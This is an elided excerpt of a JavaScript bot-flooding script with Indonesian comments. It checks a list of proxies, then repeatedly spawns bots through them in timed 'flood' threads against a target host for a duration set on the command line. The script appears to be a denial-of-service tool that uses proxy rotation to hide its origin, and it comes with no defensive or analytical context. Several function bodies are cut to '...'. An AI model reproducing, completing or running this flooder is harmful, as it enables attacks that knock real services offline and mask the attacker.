...
const botCount = 100;
const timeout = 250;
const floodDuration = isNaN(process.argv[4]) ? 0 : parseInt(process.argv[4], 10) * 1000;
...
async function checkProxy(proxy) {
  ...
  return new Promise((resolve) => {
    ...
    socket.connect(parsedPort, host);
  });
}
...
function createBot(index, proxy) {
  ...
  bot.on('error', (err) => {
    if (!err.code || !['ETIMEDOUT', 'ECONNRESET', 'ECONNREFUSED'].includes(err.code)) {
      console.log(`Bot${index} encountered an error: ${err.message}`);
    }
  });
...
async function runBots() {
  ...
  if (validProxies.length === 0) {
    console.log('Tidak ada proxy yang valid.');
    return;
  }
  ...
  for (let i = 0; i < threads; i++) {
    (function floodThread() {
      if (Date.now() - startTime < floodDuration) {
        createBot(i + 1, validProxies[i] || validProxies[0]); // Gunakan proxy pertama jika kurang dari botCount

        setTimeout(floodThread, 100); // Delay untuk menghindari reconnect terlalu cepat
      }
    })();
  }
